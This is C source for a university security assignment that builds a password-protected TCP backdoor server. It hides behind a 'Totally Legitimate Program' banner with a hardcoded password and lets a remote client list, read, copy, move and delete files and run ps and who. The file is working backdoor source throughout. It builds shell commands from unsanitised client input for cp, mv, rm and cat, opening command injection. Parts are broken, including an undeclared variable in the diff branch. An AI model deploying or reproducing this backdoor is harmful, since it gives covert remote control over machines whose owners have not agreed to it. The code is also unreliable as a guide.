/*******************************************************************************************
*	CPSC 526 Fall 2017																	   *
* 	Tutorial 3																			   *
* 	Assignment 2																		   *
* 	Group: Marcin M. Malec 10042244, and Nathan Dien 10162905							   *
* 	This program uses the secretServer.c code from professor Pavol Federl				   *
*	This program uses the calling an external process [c] code from professor Pavol Federl *
*																						   *
*******************************************************************************************/

/*****************************
*	Commands || Status		 *
*	pwd		 ||	Complete	 *
*	cd		 ||	Complete 	 *
*	ls		 ||	Complete	 *
*	cp		 ||	Complete 	 *
*	mv		 ||	Complete 	 *
*	rm		 ||	Complete	 *
*	cat		 ||	Complete	 *
*	snap	 ||	Not Complete *
*	diff	 ||	Not Complete *
*	help	 ||	Complete	 *
*	logout	 ||	Complete	 *
*	off		 ||	Complete	 *
*	who		 ||	Complete	 *
*	ps		 ||	Complete	 *
*****************************/

/***********************************************************************
* NOTE: Partial Status means that the command performs its function,   *
* But does also allow additional functionality as it would normally do *
* For example cp is meant to copy file1 to file2,					   *
* but will also copy files to a directory as normal					   *
***********************************************************************/

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>
#include <ctype.h>

// Constants
#define BUFFSIZE 1024

// global variables nicely grouped
struct {
    int port; // listening port
	char password[32]; // required password
    char buffer[BUFFSIZE]; // Input buffer
	char dir[BUFFSIZE]; // Directory buffer
	char snapPath[BUFFSIZE]; // File path to snap.txt
	char snapHash[BUFFSIZE][50]; // hashes for snap
	char snapFn[BUFFSIZE][50]; // file names for snap
	char diffHash[BUFFSIZE][50]; // hashes for diff
	char diffFn[BUFFSIZE][50]; // file names for diff
} globals;

// report error message & exit
void die( const char * errorMessage, ...) {
    fprintf( stderr, "Error: ");
    va_list args;
    va_start( args, errorMessage);
    vfprintf( stderr, errorMessage, args);
    fprintf( stderr, "\n");
    va_end( args);
    exit(-1);
}

// read a line of text from file descriptor into provided buffer
void readLineFromFd( int fd, char * buff, size_t buffLength) {
    char * ptr = buff;
    
    //Count ensures that program does not write past bounds of buffer
    int count = (int)buffLength;
    
    //Exits loop upon count reaching 1 (buffer length reached)
    while(count > 1) {
        // try to read in the next character from fd, exit loop on failure
        if( read( fd, ptr, 1) < 1) break;
        // character stored, now advance ptr and decrement count
        ptr ++;
        count --;
        // if last character read was a newline, exit loop
        if( * (ptr - 1) == '\n') break;
    }
    // rewind ptr to the last read character
    ptr --;
    // trim trailing spaces (including new lines, telnet's \r's)
    while(ptr > buff && isspace(* ptr)) ptr --;
    // terminate the string
    * (ptr + 1) = '\0';
}

// write a string to file descriptor
int writeStrToFd( int fd, char * str) {
   return write( fd, str, strlen( str));
}

int main( int argc, char ** argv)
{
	int off = 0;
	int logout;
	FILE *fp;
	/* Satus code for popen */
	int status;
	/* Just some buffer */
	char buff[BUFFSIZE];
	/* Token for strtok */
	char *token;
	/* Filenames */
	char file1[32];
	char file2[32];
    // parse command line arguments
    if( argc != 2) die( "Usage: server port");
    char * end = NULL;
    globals.port = strtol( argv[1], & end, 10);
    if( * end != 0) die( "bad port %s", argv[1]);
	/* Hard code password */	
	strcpy(globals.password, "pass");
	/* Get current directory */
	fp = popen("pwd", "r");
	if (fp == NULL) {
		/* Error */
		die("File pointer = NULL");
	}
	fgets(globals.dir, BUFFSIZE, fp);
	status = pclose(fp);
	if (status == -1) {
		/* Error */
		die("Error in initial pclose: %s", strerror(errno));
	}
	else {
		printf("Backdoor directory: %s", globals.dir);
	}

    // create a listenning socket on a given port
    struct sockaddr_in servaddr;
    int listenSockFd = socket(AF_INET, SOCK_STREAM, 0);
    if( listenSockFd < 0) die("socket() failed");
    bzero( (char *) & servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htons(INADDR_ANY);
    servaddr.sin_port = htons(globals.port);
    if( bind(listenSockFd, (struct sockaddr *) & servaddr, sizeof(servaddr)) < 0)
        die( "Could not bind listening socket: %s", strerror( errno));

    // listen for a new connection
    if( listen(listenSockFd, 3) != 0)
        die( "Could not listen for incoming connections.");

	/**************
	* Listen Here *
	**************/
    while(!off) {
        printf( "Waiting for a new connection...\n");
        // accept a new connection
        int connSockFd = accept(listenSockFd, NULL, NULL);
        if( connSockFd < 0) die( "accept() failed: %s", strerror(errno));
        printf( "Talking to someone.\n");
        // sey hello to the other side
        writeStrToFd( connSockFd, "Totally Legitimate Program 1.0\nPlease enter the password.\n");
        //Calculates the length of buffer
        size_t length = ( sizeof(globals.buffer) / sizeof(globals.buffer[0]));
        // read response from socket
        readLineFromFd( connSockFd, globals.buffer, length);
        // check if it was a correct password
        printf("%s vs. %s\n", globals.password, globals.buffer);
		
		/*****************
		* Enter Password *
		*****************/
        if( strcmp( globals.buffer, globals.password) == 0) {
            // password was correct, cont
            printf( "Password entered correctly.\n");
			writeStrToFd( connSockFd, "Password entered correctly.\nBackdoor 1.0\n");
			logout = 0;
			/***************
			* Connect Here *
			***************/
			while(!logout) {
				buff[0] = '\0';
				writeStrToFd( connSockFd, "Please enter a command: ");
				readLineFromFd( connSockFd, globals.buffer, length);
				/* pwd: Return the current working directory */
				if (strcmp(globals.buffer, "pwd") == 0) {
					fp = popen("pwd", "r");
					if (fp == NULL) {
						/* Error */
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					if (status == -1) {
						die("Error in pwd pclose: %s", strerror(errno));
					}
					else if (status == 0) {
						printf("pwd status code: %d\n", status);
						printf("Execution successful\n");
					}
					else {
						printf("pwd status code: %d\n", status);
						printf("Execution unsuccessful\n");
						writeStrToFd(connSockFd, "Error in pwd execution\n");
					}
				}
				/* cd <dir>: Change the current working directory to <dir> */
				else if (strncmp(globals.buffer, "cd", 2) == 0) {
					/* Add code */
					strncpy(buff, globals.buffer + 3, BUFFSIZE - 3);
					status = chdir(buff);
					printf("%s\n", buff);
					if (status == -1) {
						/* For some reason having \n in the first write doesn't do anyting */
						printf("Error in chdir: %s\n", strerror(errno));
						writeStrToFd(connSockFd, ("%s", strerror(errno)));
						writeStrToFd(connSockFd, "\n");
					}
					else {
						printf("Directory change\n");
						writeStrToFd(connSockFd, "Directory changed to ");
						writeStrToFd(connSockFd, ("%s", buff));
						writeStrToFd(connSockFd, "\n");
					}
				}
				/* ls: List the contents of the current working directory */
				else if (strcmp(globals.buffer, "ls") == 0) {
					fp = popen("ls", "r");
					if (fp == NULL) {
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					if (status == -1) {
						die("Error in ls pclose: %s", strerror(errno));
					}
					else if (status == 0){
						printf("ls status code: %d\n", status);
						printf("Execution successful\n");
					}
					else {
						printf("ls status code: %d\n", status);
						printf("Execution unsuccessful\n");
						writeStrToFd(connSockFd, "Error in ls execution\n");
					}
				}
				/* cp <file1> <file2>: Copy <file> to <file2> */
				else if (strncmp(globals.buffer, "cp", 2) == 0) {
					
/*********************
					* Extract file names *
					*********************/
					token = strtok(globals.buffer, " ");
					token = strtok(NULL, " ");
					if (token != NULL) {
						strncpy(file1, token, 32);
						token = strtok(NULL, " ");
						if (token != NULL) {
							strncpy(file2, token, 32);
							if ((strtok(NULL, " ") != NULL)) {
								writeStrToFd(connSockFd, "Too many parameters\nUsage: mv <file1> <file2>\n");
							}
							else {
								/* 
								* NOT Safe functions
								* Since we limit filenames to 31 characters (plus terminating)
								* We should be able to fit everything
								*/
								strcpy(buff, "cp ");
								strcat(buff, file1);
								strcat(buff, " ");
								strcat(buff, file2);
								strcat(buff, "\0");
								fp = popen(buff, "r");
								if (fp == NULL) {
									die("File pointer = NULL");
								}
								status = pclose(fp);
								if (status == -1) {
									die("Error in cp pclose: %s", strerror(errno));
								}
								else if (status == 0) {
									printf("cp status code: %d\n", status);
									printf("Execution successful\n");
									writeStrToFd(connSockFd, "File copied\n");
								}
								/* No such file or directory/Is a directory error */
								else if (status == 256) {
									writeStrToFd(connSockFd, "No such file or directory\n");
								}
								else {
									printf("cp status code: %d\n", status);
									printf("Execution unsuccessful\n");
									writeStrToFd(connSockFd, "Error in execution\n");
								}
							}
						}
						else {
							writeStrToFd(connSockFd, "Usage: cp <file1> <file2>\n");
						}
					}
					else {
						writeStrToFd(connSockFd, "Usage: cp <file1> <file2>\n");
					}
				}
				/* mv <file1> <file2>: Rename <file1> to <file2> */
				else if (strncmp(globals.buffer, "mv", 2) == 0) {
					/*********************
					* Extract file names *
					*********************/						
					token = strtok(globals.buffer, " ");
					token = strtok(NULL, " ");
					if (token != NULL) {
						strncpy(file1, token, 32);
						token = strtok(NULL, " ");
						if (token != NULL) {
							strncpy(file2, token, 32);
							if ((strtok(NULL, " ") != NULL)) {
								writeStrToFd(connSockFd, "Too many parameters\nUsage: mv <file1> <file2>\n");
							}
							else {
								/* 
								* NOT Safe functions
								* Since we limit filenames to 31 characters (plus terminating)
								* We should be able to fit everything
								*/
								strcpy(buff, "mv ");
								strcat(buff, file1);
								strcat(buff, " ");
								strcat(buff, file2);
								strcat(buff, "\0");
								fp = popen(buff, "r");
								if (fp == NULL) {
									die("File pointer = NULL");
								}
								status = pclose(fp);
								if (status == -1) {
									die("Error in mv pclose: %s", strerror(errno));
								}
								else if (status == 0) {
									printf("mv status code: %d\n", status);
									printf("Execution successful\n");
									writeStrToFd(connSockFd, "mv command executed\n");
								}
								/* No such file or directory/Is a directory error */
								else if (status == 256) {
									writeStrToFd(connSockFd, "No such file or directory\n");
								}
								else {
									printf("mv status code: %d\n", status);
									printf("Execution unsuccessful\n");
									writeStrToFd(connSockFd, "Error in execution\n");
								}
							}
							
						}
						else {
							writeStrToFd(connSockFd, "Usage: mv <file1> <file2>\n");
						}
					}
					else {
						writeStrToFd(connSockFd, "Usage: mv <file1> <file2>\n");
					}
				}
				/* rm <file>: Delete <file> */
				else if (strncmp(globals.buffer, "rm", 2) == 0) {
					if (strncmp(globals.buffer, "rm ", 3) == 0) {
						if (globals.buffer[3] == ' ' || globals.buffer[3] == '\0') {
							writeStrToFd( connSockFd, "Usage: rm <file>\n");
						}
						else {
							/* Remove all white space */
							/*
							* The point of doing this is so that only one filename exists
							* Everything else is rejected
							*/
							for (int i = 4; i <BUFFSIZE; i++) {
								if (globals.buffer[i] == ' ') {
									for (int j = i; j < BUFFSIZE-1; j++) {
										globals.buffer[j] = globals.buffer[j+1];
									}
								}
							}
							fp = popen(globals.buffer, "r");
							if (fp == NULL) {
								die("File pointer = NULL");
							}
							while (fgets(buff, BUFFSIZE, fp) != NULL) {
								printf("%s", buff);
								writeStrToFd( connSockFd, ("%s", buff));
							}
							status = pclose(fp);
							if (status == -1) {
								die("Error in rm pclose: %s", strerror(errno));
							}
							else if (status == 0) {
								printf("rm status code: %d\n", status);
								printf("Execution successful\n");
								writeStrToFd(connSockFd, "File deleted\n");
							}
							/* No such file or directory/Is a directory error */
							else if (status == 256) {
								writeStrToFd(connSockFd, "No such file\n");
							}
							else {
								printf("rm status code: %d\n", status);
								printf("Execution unsuccessful\n");
								writeStrToFd(connSockFd, "Error in execution\n");
							}
						}
					}
					else {
						writeStrToFd( connSockFd, "Usage: rm <file>\n");
					}
				}
				/* cat <file>: Return contents of <file> */
				else if (strncmp(globals.buffer, "cat", 3) == 0) {
					if (strncmp(globals.buffer, "cat ", 4) == 0) {
						if (globals.buffer[4] == ' ' || globals.buffer[4] == '\0') {
							writeStrToFd( connSockFd, "Usage: cat <file>\n");
						}
						else {
							/* Remove all white space */
							/*
							* The point of doing this is so that only one filename exists
							* Everything else is rejected
							*/
							for (int i = 5; i <BUFFSIZE; i++) {
								if (globals.buffer[i] == ' ') {
									for (int j = i; j < BUFFSIZE-1; j++) {
										globals.buffer[j] = globals.buffer[j+1];
									}
								}
							}
							fp = popen(globals.buffer, "r");
							if (fp == NULL) {
								die("File pointer = NULL");
							}
							while (fgets(buff, BUFFSIZE, fp) != NULL) {
								printf("%s", buff);
								writeStrToFd( connSockFd, ("%s", buff));
							}
							printf("\n");
							writeStrToFd(connSockFd, "\n");
							status = pclose(fp);
							if (status == -1) {
								die("Error in cat pclose: %s", strerror(errno));
							}
							else if (status == 0) {
								printf("cat status code: %d\n", status);
								printf("Execution successful\n");
							}
							/* No such file or directory/Is a directory error */
							else if (status == 256) {
								writeStrToFd(connSockFd, "No such file\n");
							}
							else {
								printf("cat status code: %d\n", status);
								printf("Execution unsuccessful\n");
								writeStrToFd(connSockFd, "Error in execution\n");
							}
						}
					}
					else {
						writeStrToFd( connSockFd, "Usage: cat <file>\n");
					}
				}	
				/* snap: Take snapshot of all files in the current directory and store it in memory */
				else if (strcmp(globals.buffer, "snap") == 0) {
					fp = popen("md5sum *> snap.txt", "r");

					
					if(fp == NULL) {
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					
					char *filePath = realpath("snap.txt", globals.snapPath); // Gets file path of snap.txt for use in diff
					printf("Snapshot path: %s\n", globals.snapPath);
					
					if (status == -1) {
						die("Error in snap pclose: %s", strerror(errno));
					}
					else if (status == 0) {
						printf("snap status code: %d\n", status);
						printf("Execution successful\n");
						writeStrToFd(connSockFd, "OK\n");
					}
					//Directory found (ignored by md5sum hash)
					else if (status == 256) {
						printf("snap status code: %d\n", status);
						printf("Execution successful\n");
						writeStrToFd(connSockFd, "OK\n");
						writeStrToFd(connSockFd, "Found a directory\n");
					}
					else {
						printf("snap status code: %d\n", status);
						printf("Execution unsuccessful\n");
						writeStrToFd(connSockFd, "Error in snap execution\n");
					}
					
				}
				/* diff: Compare the contents of the current directory to the saved sanpshot */
				else if (strcmp(globals.buffer, "diff") == 0) {
					
					// Checks that snap.txt exists (snapshot previously used)
					if( access( "snap.txt", F_OK ) != -1) {
						
						char *filePath = realpath("snap.txt", globals.snapPath); // Gets file path of snap.txt
						printf("Snapshot path: %s\n", globals.snapPath);
						pathSet = true;
						
					}
					if(access(globals.snapPath, F_OK) != -1) {
					
						fp = popen("md5sum *> diff.txt", "r");
						
						
						if(fp == NULL) {
							die("File pointer = NULL");
						}
						while (fgets(buff, BUFFSIZE, fp) != NULL) {
							printf("%s", buff);
							writeStrToFd( connSockFd, ("%s", buff));
						}
						status = pclose(fp);
						
						int snapSize = 0, diffSize = 0;
						
						fp = fopen(globals.snapPath, "r");
						
						// Reads snap file into char array
						while(snapSize < BUFFSIZE && fscanf(fp, "%s %s", &globals.snapHash[snapSize], &globals.snapFn[snapSize]) == 2) {
							snapSize++;
						} 
						fclose(fp);
						
						fp = fopen("diff.txt", "r");
						
						// Reads diff fiel into char array
						while(diffSize < BUFFSIZE && fscanf(fp, "%s %s", &globals.diffHash[diffSize], &globals.diffFn[diffSize]) == 2) {
							diffSize++;
						} 
						fclose(fp);
						
						bool fileFound = false;
						int snapCount, diffCount;
						
						// Checks if file has been changed or deleted
						for(snapCount = 0; snapCount < snapSize; snapCount++) {
							fileFound = false;
							
							for(diffCount = 0; diffCount < diffSize; diffCount++) {
								
								// Checks for matching file name
								if(strncmp(globals.snapFn[snapCount], globals.diffFn[diffCount], BUFFSIZE) == 0) {
									
									fileFound = true;
									
									// Checks if snap.txt or diff.txt is found so that they are not outputed to client as changed (do nothing)
									if(strncmp(globals.diffFn[diffCount], "snap.txt", BUFFSIZE) == 0 || strncmp(globals.diffFn[diffCount], "diff.txt", BUFFSIZE) == 0) {}
									// Prints message to client if hash does not match
									else if(strncmp(globals.snapHash[snapCount], globals.diffHash[diffCount], BUFFSIZE) != 0) {
										
										writeStrToFd(connSockFd, ("%s", globals.snapFn[snapCount]));
										writeStrToFd(connSockFd, " - was changed\n");
									}
								
								}
								
							}
							// File in snap hash was not found in diff hash (file deleted)
							if(fileFound == false) {
								writeStrToFd(connSockFd, ("%s", globals.snapFn[snapCount]));
								writeStrToFd(connSockFd, " - was deleted\n");
							}
								
						}
						
						// Checks if file has been added
						for(diffCount = 0; diffCount < diffSize; diffCount++) {
							
							fileFound = false;
							
							for(snapCount = 0; snapCount < snapSize; snapCount++) {
								
								// Checks if snap.txt or diff.txt is found so that they are not outputed to client as new files
								if(strncmp(globals.diffFn[diffCount], "snap.txt", BUFFSIZE) == 0 || strncmp(globals.diffFn[diffCount], "diff.txt", BUFFSIZE) == 0) {
									fileFound = true;
								}
								else if(strncmp(globals.snapFn[snapCount], globals.diffFn[diffCount], BUFFSIZE) == 0) {
									fileFound = true;
								}
								
							}
							// File found in diff hash was not found in snap (file added)
							if(fileFound == false) {
								writeStrToFd(connSockFd, ("%s", globals.diffFn[diffCount]));
								writeStrToFd(connSockFd, " - was added\n");
							}
							
						}
						
						if (status == -1) {
							die("Error in snap pclose: %s", strerror(errno));
						}
						else if (status == 0) {
							printf("snap status code: %d\n", status);
							printf("Execution successful\n");
							writeStrToFd(connSockFd, "OK\n");
						}
						// Directory found (ignored by md5sum hash)
						else if (status == 256) {
							printf("snap status code: %d\n", status);
							printf("Execution successful\n");
							writeStrToFd(connSockFd, "Found a directory\n");
							writeStrToFd(connSockFd, "OK\n");
						}
						else {
							printf("snap status code: %d\n", status);
							printf("Execution unsuccessful\n");
							writeStrToFd(connSockFd, "Error in snap execution\n");
						}
						
					}
					else {
						writeStrToFd(connSockFd, "ERROR: no snapshot\n");
					}

				}
				/* who: list user[s] currently logged in */
				else if (strcmp(globals.buffer, "who") == 0) {
					fp = popen("who", "r");
					if (fp == NULL) {
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					if (status == -1) {
						die("Error in who pclose: %s", strerror(errno));
					}
					else if (status == 0) {
						printf("who status code: %d\n", status);
						printf("Execution successful\n");
					}
					else {
						printf("who status code: %d\n", status);
						printf("Execution unsuccessful\n");
						writeStrToFd(connSockFd, "Error in execution\n");
					}
				}
				/* ps: Show currently running processes */
				else if (strcmp(globals.buffer, "ps") == 0) {
					fp = popen("ps", "r");
					if (fp == NULL) {
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					if (status == -1) {
						die("Error in ps pclose: %s", strerror(errno));
					}
					else if (status == 0) {
						printf("ps status code: %d\n", status);
						printf("Execution successful\n");
					}
					else {
						printf("ps status code: %d\n", status);
						printf("Execution unsuccessful\n");
						writeStrToFd(connSockFd, "Error in execution\n");
					}
				}
				/* help: print list of commands, or print specified command function */
				else if (strncmp(globals.buffer, "help", 4) == 0) {
					/* Only help was entered */
					if (strcmp(globals.buffer, "help") == 0) {
						printf("Help command entered.\n");
						writeStrToFd(connSockFd, "pwd, cd, ls, cp, mv, rm, cat, snap, diff, help, logout, off, who, ps.\n");
					}
					/* Additional parameter */
					else if (strcmp(globals.buffer, "help pwd") == 0) {
						printf("Help command entered: pwd command.\n");
						writeStrToFd(connSockFd, "Returns the current working directory.\n");
					}
					else if (strcmp(globals.buffer, "help cd") == 0) {
						printf("Help command entered: cd command.\n");
						writeStrToFd(connSockFd, "Usage: cd <dir>\nChange the current working directory to <dir>.\n");
					}
					else if (strcmp(globals.buffer, "help ls") == 0) {
						printf("Help command entered: ls command.\n");
						writeStrToFd(connSockFd, "Usage: ls\nList the contents of the current working directory.\n");
					}
					else if (strcmp(globals.buffer, "help cp") == 0) {
						printf("Help command entered: cp command.\n");
						writeStrToFd(connSockFd, "Usage: cp <file1> <file2>\nCopy <file1> to <file2>.\nCopy <file> to <dir>.\n");
					}
					else if (strcmp(globals.buffer, "help mv") == 0) {
						printf("Help command entered: mv command.\n");
						writeStrToFd(connSockFd, "Usage: mv <file1> <file2>\nRename <file1> to <file2>.\nMove <file> to <dir>.\n");
					}
					else if (strcmp(globals.buffer, "help rm") == 0) {
						printf("Help command entered: rm command.\n");
						writeStrToFd(connSockFd, "Usage: rm <file>\nDelete <file>.\n");
					}
					else if (strcmp(globals.buffer, "help cat") == 0) {
						printf("Help command entered: cat command.\n");
						writeStrToFd(connSockFd, "Usage: cat <file>\nReturn contents of the file.\n");
					}
					else if (strcmp(globals.buffer, "help snap") == 0) {
						printf("Help command entered: snap command.\n");
						writeStrToFd(connSockFd, "Usage: snap\nTake snapshot of all the files in the current directory and store it in memory.\n");
					}
					else if (strcmp(globals.buffer, "help diff") == 0) {
						printf("Help command entered: diff command.\n");
						writeStrToFd(connSockFd, "Usage: diff\nCompare the contents of the current directory to the saved snapshot.\n");
					}
					else if (strcmp(globals.buffer, "help logout") == 0) {
						printf("Help command entered: logout command.\n");
						writeStrToFd(connSockFd, "Usage: logout\nDisconnect from the server.\n");
					}
					else if (strcmp(globals.buffer, "help off") == 0) {
						printf("Help command entered: off command.\n");
						writeStrToFd(connSockFd, "Usage: off\nTerminate the backdoor program.\n");
					}
					else if (strcmp(globals.buffer, "help who") == 0) {
						printf("Help command entered: who command.\n");
						writeStrToFd(connSockFd, "Usage: who\nList user[s] currently logged in.\n");
					}
					else if (strcmp(globals.buffer, "help ps") == 0) {
						printf("Help command entered: ps command.\n");
						writeStrToFd(connSockFd, "Usage: ps\nShow currently running processes.\n");
					}
					/* help: Incorrect usage */
					else {
						printf("Help command entered: Incorrect usage.\n");
						writeStrToFd(connSockFd, "Usage: help or help <command>\n");
					}
				}
				/* logout: Logout the user */
				else if (strcmp(globals.buffer, "logout") == 0) {
					logout = 1;
					printf("Logging out user\n");
					writeStrToFd( connSockFd, "Goodbye\n");
				}
				/* off: Logout user and terminate program */
				else if (strcmp(globals.buffer, "off") == 0) {
					off = 1;
					logout = 1;
					printf("Program terminating\n");
					writeStrToFd( connSockFd, "Terminating program.\n");
				}
				/* Incorrect command */
				else {
					printf("Incorrect command entered.\n");
					writeStrToFd( connSockFd, "Sorry, I don't understand this command.\n");
				}
			}
        }
        else {
            // password was incorrect
            printf( "Someone used an incorrect password.\n");
            writeStrToFd( connSockFd, "Nothing to see here, move along\n");
        }
        // close the connection
        close( connSockFd);
    }
	/* Return working directory back to initial */
	//chdir(globals.dir);
	// close the socket
    close( listenSockFd);
    return 0;
}
